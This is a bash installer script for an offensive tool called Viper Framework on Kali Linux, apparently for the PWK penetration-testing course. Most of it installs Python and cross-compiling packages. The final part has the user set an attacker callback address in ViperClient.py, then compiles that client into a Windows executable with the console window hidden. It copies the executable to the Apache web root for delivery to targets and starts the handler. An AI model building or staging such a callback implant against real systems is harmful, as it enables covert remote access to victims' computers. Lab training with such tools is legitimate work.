# ------------------------------------------------------------
# Setup Environment
# This is the installable script to install on kali 2.0
# ------------------------------------------------------------

echo "setting permissions......"
chmod +x start-teamserver.sh
chmod +x /application/services/viperserver.py
echo ""
echo "permissions set now read this first *Important this is in development. Please take a snapshot before install"
echo ""
echo "This is the install for Viper Framework and before you run this script make sure that you navigate 
to payloads/ViperClient.py and change the IPADDESS and PORT number that you want client to call back to. 
You will only have to run this installation script once, we are not updating your kali but only grabbing 
specific installation items for Viper. This program has only been tested on X86 Kali 2.0 for PWK. If you have 
not changed the IP address and port number inside ViperClient.py then hit Ctrl-T and go do that. 
Then run ./installer.sh again and proceed if you have already changed the IP address and port number inside 
ViperClient.py press any key to continue"

echo ""
echo "Important first change this line to your own correct settings s.connect(('0.0.0.0', 8081)), 
inside payloads/ViperClient.py"
echo ""
echo ""
echo "Viper will autostart and your should scroll through the install to see what is happening"
echo ""
echo "This may take a little while so it's a good time for a coffee :-)"

read -n 1 -s -p "Press any key to continue"

sudo apt-get update

echo "Viper will install twisted +17 python, zope.interface, pycrypto & more"
echo "Viper will install python setuptools, software properties, and depends"
apt-get install python-setuptools -y
apt-get install python-software-properties -y
apt-get install build-essential libssl-dev libffi-dev python-dev -y
apt-get install python-dev -y
apt-get install python-pip -y
apt-get install python-twisted -y
pip install zope.interface
pip install --upgrade twisted
pip install service_identity
pip install pycrypto
pip install cryptography

#location of twisted source ver 17.1.0 if needed
#wget https://twistedmatrix.com/Releases/Twisted/17.1/Twisted-17.1.0.tar.bz2
#tar xvf Twisted-17.1.0.tar.bz2
#cd Twisted-17.1.0
#cd Twisted-17.1.0
#pythin setup.py install
echo "we will have to modify the bashrc. add the command between brackets to bashrc (export PYTHONPATH="") then restart bashrc. don't worry we can do it for you"
echo "We will have to backup bashrc first"

cp ~/.bashrc bashrc.bak

echo export PYTHONPATH="" >> ~/.bashrc

source ~/.bashrc

echo "bashrc config completed"
echo "Please go back and check the bash rc file, pythonpath="" should be appended to end of file"
echo "If you have an issue with the bash rc file we have a command to reinstall"

#echo "sudo apt-get -o Dpkg::Options::="--force-confmiss" install --reinstall bash"
#new bash should be in /etc/skel/
#copy new bashrc file to ~/bashrc and append pythonpath to the end

echo "building cross compiler to compile exec files on Linux for windows....."
sudo apt-get install wine winetricks
#winetricks python

#cd ~/.wine/drive_c/Python26

#Note that python26 is installed, not including pip (is used to install pyinstaller). Fortunately, newer Python versions already include pip. 
#Choose the proper version from Download Python (for me, python-2.7.10.msi) and install it on wine by:

#get python 2.7.13 or which ever you choose
#https://www.python.org/downloads/
#We will fetch it for you


echo "fetching python msi 2.7.13 for cross compiling on linux for windows x86...."


cd /home/viper-framework
wget https://www.python.org/ftp/python/2.7.13/python-2.7.13.msi

echo "Installing python msi 2.7.13 for cross compiling on linux for windows x86...."
echo "You will have to click next three or four time to install python inside wine on kali...."
echo "You will have to click next three or four time to install python inside wine on kali...."
echo "You will have to click next three or four time to install python inside wine on kali...."
#navigate to the correct directory with the python.msi inside and run command

wine msiexec /i python-2.7.13.msi /L*v log.txt


#Install PyInstaller on wine

echo "Installing Pyinstaller on wine for cross compiling...."

cd ~/.wine/drive_c/Python27
wine python.exe Scripts/pip.exe install pyinstaller
cd -

echo "Congratulations your automatic install script has finished"
echo "Everything has been taken care of you can now use viper to grab information fast"
echo "usage $> python viper.py"
echo "usage $> python viper.py"


#to Convert ViperClient.py to exe run commands below
echo "generating ViperClient.exe"

# wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile HelloWorld.py

cd payloads/
wine pyinstaller --onefile --noconsole --nowindowed ViperClient.py
rm -rf build/
rm -rf dist/
sed -i 's/console=True/console=False/g' ViperClient.spec
wine pyinstaller ViperClient.spec
cp dist/ViperClient.exe /var/www/html
cp ViperClient.py /var/www/html
rm -rf build/
rm -rf dist/
cd ../


echo "copied ViperClient.exe and ViperClient.py to /var/www/html"
echo "run start apache2 service to start your server and deliver the client"

echo "usage $> python viper.py"
echo "Viper $> handler"
echo "good luck on PWK"

# wine  wine pyinstaller ViperClient.spec
# modify ViperClient.spec
# run python ViperClient.spec and change console=True to Console=False
rm python-2.7.13.msi
rm python-2.7.13.msi.*
python viper.py


